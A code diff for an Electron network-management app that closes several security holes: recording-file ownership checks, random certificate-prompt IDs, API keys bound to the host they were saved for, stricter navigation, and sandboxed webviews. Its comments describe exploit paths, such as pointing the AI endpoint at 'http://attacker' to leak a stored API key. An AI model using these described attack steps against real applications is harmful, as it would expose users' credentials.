@@ -68,8 +68,7 @@ const trayEnabled = () => trayWanted() && tray !== null;
 let trayJobCount = 0; // 托盘菜单显示的活动监控任务数
 let webReady = false;              // Web 管理页窗口渲染层是否就绪
 const pendingWebTabs = [];         // 等待 Web 窗口加载完成的 newtab 消息
-let certSeq = 0;
-const pendingCert = new Map();     // id -> { callback, host, url, error, fp }
+const pendingCert = new Map();     // id -> { callback, host, url, error, fp, shown }
 const allowedCerts = new Map();    // host -> 已允许的证书指纹（按指纹固定，指纹变化重新询问）
 const certQueue = [];              // 窗口未就绪时到达的证书告警
 let shellReady = false;            // Shell 窗口渲染层是否已就绪（did-finish-load）
@@ -81,6 +80,9 @@ const shell = new ShellManager({ logDir: path.join(app.getPath('userData'), 'mon
 /* ---- 设备后台静默监控（复用 Web Shell 底层连接，独立监视任务） ---- */
 const configBackup = new ConfigBackupStore(path.join(app.getPath('userData'), 'config-backups'));
 const monitor = new MonitorManager(shell, path.join(app.getPath('userData'), 'monitor-logs'), path.join(app.getPath('userData'), 'monitor-trust.json'), { backupStore: configBackup });
+// 指纹信任裁决统一收口到 monitor 的权威信任库：无人值守采集（runOneShot）也必须遵守
+// 「首连 TOFU、变化即拒」，否则已钉扎主机的指纹变化会被静默接受并反写渲染层长期钉扎
+shell.setTrustGate((host, port, fp) => monitor.verifyFingerprint(host, port, fp));
 
 /* ---- 在线率采样（监控中心 7 天趋势）：探测结果按 10 分钟桶落盘 ---- */
 const uptimeStore = new UptimeStore(path.join(app.getPath('userData'), 'monitor-uptime.json'));
@@ -497,9 +499,10 @@ monitor.on('backup', (info) => {
 /* ---- Web Shell 会话录制（JSONL 录像：{t, dir, d} 每行一条；渲染层缓冲批量追加） ---- */
 const SHELL_REC_RE = /^rec_\d{8}_\d{6}(?:_\d+)?\.ntrec\.jsonl$/;
 let shellRecFile = null; // 当前录制文件全路径（null = 未在录制；全局单文件）
+let shellRecOwner = null; // 发起录制的 webContents：append/stop 只接受同一来源，防另一窗口注入伪造录像行
 function shellRecDir() { return path.join(app.getPath('userData'), 'shell-recordings'); }
 ipcMain.handle('shell:record-start', (e) => {
-  if (!shellSender(e)) return { ok: false, error: 'forbidden' };
+  if (!shellWinSender(e)) return { ok: false, error: 'forbidden' };
   if (shellRecFile) return { ok: true, name: path.basename(shellRecFile), existed: true };
   try {
     fs.mkdirSync(shellRecDir(), { recursive: true });
@@ -509,22 +512,27 @@ ipcMain.handle('shell:record-start', (e) => {
     let name = base + '.ntrec.jsonl';
     for (let i = 2; fs.existsSync(path.join(shellRecDir(), name)); i++) name = base + '_' + i + '.ntrec.jsonl';
     shellRecFile = path.join(shellRecDir(), name);
+    shellRecOwner = e.sender;
     fs.writeFileSync(shellRecFile, JSON.stringify({ t: 0, dir: 'meta', d: { startedAt: Date.now() } }) + '\n', 'utf8');
     return { ok: true, name };
-  } catch (err) { shellRecFile = null; return { ok: false, error: String((err && err.message) || err) }; }
+  } catch (err) { shellRecFile = null; shellRecOwner = null; return { ok: false, error: String((err && err.message) || err) }; }
 });
 ipcMain.handle('shell:record-append', (e, p) => {
-  if (!shellSender(e)) return { ok: false, error: 'forbidden' };
+  if (!shellWinSender(e)) return { ok: false, error: 'forbidden' };
   if (!shellRecFile) return { ok: false, error: '未在录制中' };
+  // 只接受发起录制的那一个窗口：会话录像属审计证据，别窗口（含被注入的主窗）不得追加伪造行
+  if (shellRecOwner && e.sender !== shellRecOwner) return { ok: false, error: 'forbidden' };
   const lines = String((p && p.lines) || '');
   if (!lines || lines.length > 1024 * 1024) return { ok: false, error: '录制数据为空或过大' };
   try { fs.appendFileSync(shellRecFile, lines.endsWith('\n') ? lines : lines + '\n', 'utf8'); return { ok: true }; }
   catch (err) { return { ok: false, error: String((err && err.message) || err) }; }
 });
 ipcMain.handle('shell:record-stop', (e) => {
-  if (!shellSender(e)) return { ok: false, error: 'forbidden' };
+  if (!shellWinSender(e)) return { ok: false, error: 'forbidden' };
+  if (shellRecOwner && e.sender !== shellRecOwner) return { ok: false, error: 'forbidden' };
   const f = shellRecFile;
   shellRecFile = null;
+  shellRecOwner = null;
   return { ok: true, name: f ? path.basename(f) : null };
 });
 ipcMain.handle('shell:record-list', (e) => {
@@ -533,7 +541,8 @@ ipcMain.handle('shell:record-list', (e) => {
     const dir = shellRecDir();
     const items = (fs.readdirSync(dir) || [])
       .filter(n => SHELL_REC_RE.test(n))
-      .map(n => { const st = fs.statSync(path.join(dir, n)); return { name: n, size: st.size, at: st.mtimeMs }; })
+      .map(n => { const st = fs.lstatSync(path.join(dir, n)); if (!st.isFile()) return null; return { name: n, size: st.size, at: st.mtimeMs }; })
+      .filter(Boolean)
       .sort((a, b) => b.at - a.at);
     return { ok: true, items };
   } catch (err) { return { ok: true, items: [] }; }
@@ -545,7 +554,7 @@ ipcMain.handle('shell:record-read', (e, p) => {
   const full = path.join(shellRecDir(), name);
   if (!full.startsWith(path.resolve(shellRecDir()) + path.sep)) return { ok: false, error: 'forbidden' };
   try {
-    const st = fs.statSync(full);
+    const st = fs.lstatSync(full);
     if (!st.isFile() || st.size > 32 * 1024 * 1024) return { ok: false, error: '录像文件过大' };
     return { ok: true, content: fs.readFileSync(full, 'utf8') };
   } catch (err) { return { ok: false, error: '录像读取失败' }; }
@@ -692,6 +701,13 @@ function shellSender(e) {
     (shellWin && !shellWin.isDestroyed() && e.sender === shellWin.webContents)
   ));
 }
+/** 仅 Web Shell 窗口：会话录像（审计证据）的**写入**通道专用。
+ *  recordStart/append/stop 若沿用 shellSender（主窗口也算合法），被注入的主窗口可以自行
+ *  recordStart 成为 owner，再 recordAppend 凭空写入一条合法命名的录像——审计证据的完整性
+ *  就没有保证了。录像 UI 只存在于 shell-ui.js（app.js 对 record* 调用数为 0），收紧无功能损失。 */
+function shellWinSender(e) {
+  return !!(e && e.sender && shellWin && !shellWin.isDestroyed() && e.sender === shellWin.webContents);
+}
 ipcMain.handle('web:cert-allow', (e, payload) => {
   if (!webWin || webWin.isDestroyed() || e.sender !== webWin.webContents) return { ok: false, error: 'forbidden' };
   const rec = pendingCert.get(payload && payload.id);
@@ -756,14 +772,18 @@ ipcMain.handle('shell:reconnect', (e, p) => {
   if (!/^s\d+$/.test(sid)) return { ok: false, error: '无效会话' };
   return shell.reconnect(sid);
 });
+/** IPC 的 shell:data/resize/close 只允许操作 Web Shell 窗口自己的 UI 会话。
+ *  监控/独立采集会话（owner='monitor'）的输出与 id 会广播给 Shell 窗，若不加归属校验，
+ *  被注入的 Shell 窗渲染层可向正在运行的后台监控/备份连接注入命令（越过监控 readOnly 语义）或掐断连接。 */
+const shellUiSession = (id) => shell.ownerOf(id) === 'ui';
 ipcMain.on('shell:data', (e, id, data) => {
-  if (!shellSender(e)) return;
+  if (!shellSender(e) || !shellUiSession(id)) return;
   if (typeof data !== 'string') return; // 仅接受字符串：防非字符串绕过限长并致流写入崩溃
   if (data.length > 1024 * 1024) return; // 防超大粘贴/异常数据
   shell.write(id, data);
 });
-ipcMain.on('shell:resize', (e, id, cols, rows) => { if (shellSender(e)) shell.resize(id, cols, rows); });
-ipcMain.on('shell:close', (e, id) => { if (shellSender(e)) shell.close(id); });
+ipcMain.on('shell:resize', (e, id, cols, rows) => { if (shellSender(e) && shellUiSession(id)) shell.resize(id, cols, rows); });
+ipcMain.on('shell:close', (e, id) => { if (shellSender(e) && shellUiSession(id)) shell.close(id); });
 ipcMain.handle('shell:clipboard-write', (e, text) => {
   if (!shellSender(e)) return { ok: false, error: 'forbidden' };
   text = String(text == null ? '' : text);
@@ -1301,10 +1321,15 @@ ipcMain.handle('netsvc:set', async (e, p) => {
   // 防 settings.json 被无界撑大（applyConfig 内各字段本身有白名单归一化）
   try { if (Buffer.byteLength(JSON.stringify(cfg), 'utf8') > 64 * 1024) return { ok: false, error: '配置载荷过大' }; } catch (err) { return { ok: false, error: '配置载荷无效' }; }
   const status = await netSvc.applyConfig(cfg);
+  // 落盘用 applyConfig 后的「生效配置」：normalizeConfig 可能把默认/空 FTP 口令替换为随机口令，
+  // 若仍落盘原始 payload，重启后又会生成新随机口令，设备侧配置的 copy 口令每次重启即失效
+  const effective = netSvc.getConfig();
+  const ftpPasswordChanged = !!effective._ftpPasswordChanged;
   // 运行态用明文；落盘前把 FTP 口令密文化（与项目「密码经 safeStorage 落盘」惯例对齐，
   // 此前明文写 settings.json，本机其他用户可读）
   try {
-    const stored = JSON.parse(JSON.stringify(cfg));
+    const stored = JSON.parse(JSON.stringify(effective));
+    delete stored._ftpPasswordChanged;
     if (stored.ftp && typeof stored.ftp === 'object' && typeof stored.ftp.password === 'string'
       && stored.ftp.password && stored.ftp.password.indexOf(ENC_PREFIX) !== 0) {
       stored.ftp.password = encryptSecretValue(stored.ftp.password);
@@ -1320,7 +1345,7 @@ ipcMain.handle('netsvc:set', async (e, p) => {
     loadAppSettings().netSvc = stored;
     saveAppSettings();
   } catch (err) { /* 落盘失败不影响运行态 */ }
-  return { ok: true, cfg: netSvc.getConfig(), status };
+  return { ok: true, cfg: effective, status, ftpPasswordChanged };
 });
 ipcMain.handle('netsvc:files', (e) => monitorGuard(e) ? netSvc.listFiles() : { ok: false, error: 'forbidden' });
 ipcMain.handle('netsvc:file-read', (e, p) => monitorGuard(e) ? netSvc.readFile(p) : { ok: false, error: 'forbidden' });
@@ -1406,12 +1431,42 @@ ipcMain.handle('netsvc:syslog-read', (e, p) => {
 /* ---- AI 解析（LLM，仅主窗口可调用）----
  * OpenAI 兼容接口的调用全部在主进程完成（渲染层 CSP 禁止直连外网）；
  * API Key 经 safeStorage 密文存 settings.json 的 ai 键，明文只在主进程内存中出现、不回传渲染层。 */
+/** 已存 API Key 只随 https 端点出网：http:// baseUrl 不自动附带已存 Key。
+ *  否则渲染层被注入后仅需 `ai:set-config({baseUrl:'http://attacker'})`（不动 Key 字段）再触发任意
+ *  一次请求，主进程就会把用户已存的 Key 明文发往攻击者（CSP 禁渲染层直连、但主进程代发不受限）。 */
+function isHttpsUrl(u) {
+  try { return new URL(String(u)).protocol === 'https:'; } catch (e) { return false; }
+}
+/** 端点主机（小写 host:port）：已存 API Key 的绑定键——Key 只在它被保存时的那台主机上出网 */
+function aiHostOf(u) {
+  try { const p = new URL(String(u)); return (p.hostname || '').toLowerCase() + ':' + (p.port || (p.protocol === 'https:' ? '443' : '80')); } catch (e) { return ''; }
+}
+/** 端点变更审计：API 地址被改动会决定「凭据与数据发往哪台主机」，是本应用最敏感的可写配置之一。
+ *  记录到 userData/ai-endpoint.log，使「渲染层被注入后改端点」这类行为事后可查（不是无声的）。 */
+function logAiEndpointChange(from, to) {
+  try {
+    const line = '[' + new Date().toISOString() + '] AI 端点变更：' + (from || '(未配置)') + ' → ' + (to || '(清空)') + '\n';
+    fs.appendFileSync(path.join(app.getPath('userData'), 'ai-endpoint.log'), line, 'utf8');
+  } catch (e) { /* 审计日志失败不影响主流程 */ }
+}
 function aiCfgFromSettings() {
   const s = loadAppSettings().ai || {};
+  const baseUrl = typeof s.baseUrl === 'string' ? s.baseUrl : '';
+  const apiKeyStored = s.apiKeyEnc ? decryptSecretValue(s.apiKeyEnc) : '';
+  // 已存 Key **只随它被保存时的那台主机出网**：仅挡 http 是不够的——渲染层只要把 baseUrl 改成
+  // 攻击者的 https 地址（ai:set-config 不动 Key 字段，或 ai:list-models 空 Key 触发回退），主进程就会
+  // 把 Key 作为 Authorization 头发出去。绑定主机后，「改端点」这一动作本身带不走凭据。
+  // 兼容旧配置：升级前保存的 Key 没有 apiKeyHost，首次使用时就地绑定到当前端点（不改变既有行为）。
+  if (apiKeyStored && !s.ai_host) { s.ai_host = aiHostOf(baseUrl); try { saveAppSettings(); } catch (e) { /* ignore */ } }
+  const hostOk = !apiKeyStored || !s.ai_host || aiHostOf(baseUrl) === s.ai_host;
+  const apiKey = (apiKeyStored && hostOk && isHttpsUrl(baseUrl)) ? apiKeyStored : ''; // 非 https 或主机不符：不带 Key
   return {
-    baseUrl: typeof s.baseUrl === 'string' ? s.baseUrl : '',
+    baseUrl,
     model: typeof s.model === 'string' ? s.model : '',
-    apiKey: s.apiKeyEnc ? decryptSecretValue(s.apiKeyEnc) : '',
+    apiKey,
+    apiKeyStored,
+    // 有已存 Key 但当前端点主机与保存时不一致：界面据此提示「端点已改，请重新填写 API Key」
+    apiKeyHostMismatch: !!(apiKeyStored && s.ai_host && aiHostOf(baseUrl) !== s.ai_host),
     maxInputKB: Number(s.maxInputKB) > 0 ? Math.min(2048, Math.floor(Number(s.maxInputKB))) : DEFAULT_MAX_INPUT_KB,
     protocol: validateProtocol(s.protocol)
   };
@@ -1427,7 +1482,7 @@ let aiActiveClient = null;
 ipcMain.handle('ai:get-config', (e) => {
   if (!monitorGuard(e)) return { ok: false, error: 'forbidden' };
   const c = aiCfgFromSettings();
-  return { ok: true, baseUrl: c.baseUrl, model: c.model, maxInputKB: c.maxInputKB, protocol: c.protocol, apiKeySet: !!c.apiKey, apiKeyMasked: maskKey(c.apiKey) };
+  return { ok: true, baseUrl: c.baseUrl, model: c.model, maxInputKB: c.maxInputKB, protocol: c.protocol, apiKeySet: !!c.apiKeyStored, apiKeyMasked: maskKey(c.apiKeyStored), apiKeyHttpBlocked: !!c.apiKeyStored && !c.apiKey, apiKeyHostMismatch: !!c.apiKeyHostMismatch };
 });
 ipcMain.handle('ai:set-config', (e, p) => {
   if (!monitorGuard(e)) return { ok: false, error: 'forbidden' };
@@ -1437,6 +1492,7 @@ ipcMain.handle('ai:set-config', (e, p) => {
   if (p && 'baseUrl' in p) {
     const base = validateBaseUrl(p.baseUrl); // 空值合法（表示未配置）；非法格式直接拒绝并提示
     if (!base && String(p.baseUrl || '').trim()) return { ok: false, error: 'API 地址无效：需以 http:// 或 https:// 开头' };
+    if (aiHostOf(base) !== aiHostOf(s.ai.baseUrl)) logAiEndpointChange(s.ai.baseUrl, base); // 端点变更留痕
     s.ai.baseUrl = base;
   }
   if (p && 'model' in p) s.ai.model = String(p.model || '').trim().slice(0, 200);
@@ -1444,11 +1500,16 @@ ipcMain.handle('ai:set-config', (e, p) => {
     const n = Math.floor(Number(p.maxInputKB));
     s.ai.maxInputKB = (n >= 4 && n <= 2048) ? n : DEFAULT_MAX_INPUT_KB;
   }
-  if (p && p.clearApiKey) delete s.ai.apiKeyEnc;
-  else if (p && typeof p.apiKey === 'string' && p.apiKey) s.ai.apiKeyEnc = encryptSecretValue(p.apiKey.slice(0, 4096)); // 空串=保持不变；限长与 secure:encrypt 口径一致
+  if (p && p.clearApiKey) { delete s.ai.apiKeyEnc; delete s.ai.ai_host; }
+  else if (p && typeof p.apiKey === 'string' && p.apiKey) {
+    // 空串=保持不变；限长与 secure:encrypt 口径一致。保存 Key 的同时绑定当前端点主机：
+    // 之后无论谁改动 baseUrl，这把 Key 都不会被发往别的主机（见 aiCfgFromSettings）
+    s.ai.apiKeyEnc = encryptSecretValue(p.apiKey.slice(0, 4096));
+    s.ai.ai_host = aiHostOf(s.ai.baseUrl);
+  }
   saveAppSettings();
   const c = aiCfgFromSettings();
-  return { ok: true, baseUrl: c.baseUrl, model: c.model, maxInputKB: c.maxInputKB, protocol: c.protocol, apiKeySet: !!c.apiKey, apiKeyMasked: maskKey(c.apiKey) };
+  return { ok: true, baseUrl: c.baseUrl, model: c.model, maxInputKB: c.maxInputKB, protocol: c.protocol, apiKeySet: !!c.apiKeyStored, apiKeyMasked: maskKey(c.apiKeyStored), apiKeyHttpBlocked: !!c.apiKeyStored && !c.apiKey, apiKeyHostMismatch: !!c.apiKeyHostMismatch };
 });
 ipcMain.handle('ai:test', async (e) => {
   if (!monitorGuard(e)) return { ok: false, error: 'forbidden' };
@@ -1460,9 +1521,12 @@ ipcMain.handle('ai:list-models', async (e, p) => {
   const protocol = validateProtocol(p && p.protocol);
   const baseUrl = String((p && p.baseUrl) || '');
   if (!validateBaseUrl(baseUrl)) return { ok: false, error: '请先填写有效的 API 地址（http:// 或 https:// 开头）' };
-  // 表单未填 Key 时回退已保存的 Key（编辑已配置服务时不必重复输入）
+  // 表单未填 Key 时回退已保存的 Key（编辑已配置服务时不必重复输入）；但必须同时满足：
+  // ① https；② 该端点主机与 Key 保存时的主机一致。否则渲染层只要传一个自己的 https 地址
+  // 就能借这次回退把已存 Key 作为 Authorization 头发往任意主机（仅挡 http 挡不住这条路）。
   let apiKey = String((p && p.apiKey) || '');
-  if (!apiKey) apiKey = aiCfgFromSettings().apiKey;
+  const cfg = aiCfgFromSettings();
+  if (!apiKey && isHttpsUrl(baseUrl) && cfg.apiKey && aiHostOf(baseUrl) === aiHostOf(cfg.baseUrl)) apiKey = cfg.apiKey;
   const client = new AiClient({ baseUrl, apiKey, protocol });
   return client.listModels();
 });
@@ -1705,6 +1769,10 @@ app.whenReady().then(() => {
   const webPartition = session.fromPartition('persist:nettopo-web');
   webPartition.setPermissionRequestHandler((wc, permission, callback) => callback(permission === 'fullscreen'));
   webPartition.setPermissionCheckHandler((wc, permission) => permission === 'fullscreen');
+  // 主窗/Shell 窗（defaultSession，本地渲染层）同口径收敛：被注入的渲染层不应能静默请求
+  // 通知/定位/媒体等权限（与 webPartition 的 deny-all 保持一致，仅放行 fullscreen）
+  session.defaultSession.setPermissionRequestHandler((wc, permission, callback) => callback(permission === 'fullscreen'));
+  session.defaultSession.setPermissionCheckHandler((wc, permission) => permission === 'fullscreen');
   // 设备管理页（webview 分区，远程不可信内容）下载同样弹出「另存为」，避免静默写文件到下载目录
   session.fromPartition('persist:nettopo-web').on('will-download', (e, item) => {
     item.setSaveDialogOptions({
@@ -1742,7 +1810,21 @@ app.whenReady().then(() => {
           }
         }
       }
-      netSvc.applyConfig(restored).catch(() => { /* 恢复失败由面板状态展示 */ });
+      netSvc.applyConfig(restored).then(() => {
+        // 旧版本可能带着默认/空 FTP 口令落盘运行：applyConfig 会替换为随机口令（见 normalizeConfig），
+        // 这里把生效口令密文化回写，避免每次重启重新生成随机口令导致设备侧 copy 口令失效
+        const eff = netSvc.getConfig();
+        if (eff && eff._ftpPasswordChanged && eff.ftp) {
+          try {
+            const s2 = loadAppSettings();
+            const nsv = s2.netSvc && typeof s2.netSvc === 'object' ? s2.netSvc : {};
+            if (!nsv.ftp || typeof nsv.ftp !== 'object') nsv.ftp = {};
+            nsv.ftp.password = encryptSecretValue(eff.ftp.password);
+            s2.netSvc = nsv;
+            saveAppSettings();
+          } catch (err) { /* ignore */ }
+        }
+      }).catch(() => { /* 恢复失败由面板状态展示 */ });
     }
   } catch (e) { /* ignore */ }
   // Linux 无密钥环（gnome-keyring/kwallet）时 safeStorage 回退 basic_text（弱混淆非加密）：
@@ -1765,7 +1847,8 @@ app.whenReady().then(() => {
     // 按证书指纹信任：仅当「本次运行已允许该主机且指纹一致」才静默放行；指纹变化视为证书被替换，重新询问
     if (allowedCerts.get(host) === certificate.fingerprint) { callback(true); return; }
     event.preventDefault();
-    const id = 'cert' + (++certSeq);
+    // id 用随机值（非自增）：渲染层若被注入，可循环猜自增 id 抢先放行他人未确认的证书（含 MITM 坏证书）
+    const id = 'cert' + require('crypto').randomBytes(16).toString('hex');
     // 挂起确认封顶（FIFO 拒最旧）：设备页持坏证书自动重连/重载且用户不处理弹窗时，
     // pendingCert 与对应挂起的 Chromium 请求句柄会无限累积（慢速内存/句柄泄漏）
     if (pendingCert.size >= 32) {
@@ -1781,12 +1864,28 @@ app.whenReady().then(() => {
     if (BrowserWindow.getAllWindows().length === 0) createWindow();
     else if (mainWin && !mainWin.isDestroyed()) { mainWin.show(); mainWin.focus(); } // 托盘模式隐藏后经 Dock 唤回
   });
-  // 导航守卫：宿主窗口（主窗/Shell 窗/设备页宿主窗）只允许 file:// 本地页面——
-  // 一旦被诱导跳转到远程页面，preload 桥（topoShell/topoBackup）将随之泄露；webview guest 不受限
+  // 导航守卫：宿主窗口（主窗/Shell 窗/设备页宿主窗）只允许导航到本应用自身的三个本地页面——
+  // 一旦被诱导跳转到其它本地 HTML（如攻击者经 TFTP/FTP 收件目录投递的 evil.html），preload 桥
+  //（topoShell/topoSecure/topoUpdate/topoNetSvc）会随之泄露，且绕开页面 CSP；webview guest 不受限
+  // 允许的本地页面：loadFile 相对 app.getAppPath() 解析，打包后可能与 __dirname 不等，两者都纳入
+  const pageBases = [__dirname];
+  try { const ap = app.getAppPath(); if (ap && ap !== __dirname) pageBases.push(ap); } catch (e) { /* ignore */ }
+  const ALLOWED_PAGES = new Set();
+  for (const b of pageBases) for (const f of ['index.html', 'shell.html', 'webview.html']) ALLOWED_PAGES.add(path.resolve(b, f).toLowerCase());
+  const isAllowedLocalPage = (rawUrl) => {
+    let u;
+    try { u = new URL(String(rawUrl)); } catch (e) { return false; }
+    if (u.protocol !== 'file:') return false;
+    let p;
+    try { p = decodeURIComponent(u.pathname); } catch (e) { return false; }
+    // Windows 下 file:///D:/... 的 pathname 为 /D:/...：去除前导斜杠后交由 path.resolve 归一
+    p = p.replace(/^\/([A-Za-z]:)/, '$1');
+    return ALLOWED_PAGES.has(path.resolve(p).toLowerCase());
+  };
   app.on('web-contents-created', (e, contents) => {
     contents.on('will-navigate', (ev, url) => {
       if (contents.getType() === 'webview') return; // 设备页内嵌 guest 自由导航（另有 popup 拦截）
-      if (!/^file:/i.test(String(url))) ev.preventDefault();
+      if (!isAllowedLocalPage(url)) ev.preventDefault();
     });
     // 纵深：guest 一律无 preload、无 Node；src 仅放行 http(s)（渲染层已校验，此处兜底）
     contents.on('will-attach-webview', (ev, webPreferences, params) => {
@@ -1794,6 +1893,13 @@ app.whenReady().then(() => {
         delete webPreferences.preload;
         webPreferences.nodeIntegration = false;
         webPreferences.contextIsolation = true;
+        // 显式覆写而非依赖从宿主继承：<webview webpreferences="sandbox=no"> / disablewebsecurity
+        // 这类元素属性会带来降级的 guest，只有在这里主动纠正才拦得住（Electron 安全清单的要求）
+        webPreferences.sandbox = true;
+        webPreferences.webSecurity = true;
+        webPreferences.allowRunningInsecureContent = false;
+        webPreferences.nodeIntegrationInSubFrames = false;
+        webPreferences.webviewTag = false;
         if (!/^https?:\/\//i.test(String((params && params.src) || ''))) ev.preventDefault();
       } catch (err) { /* ignore */ }
     });
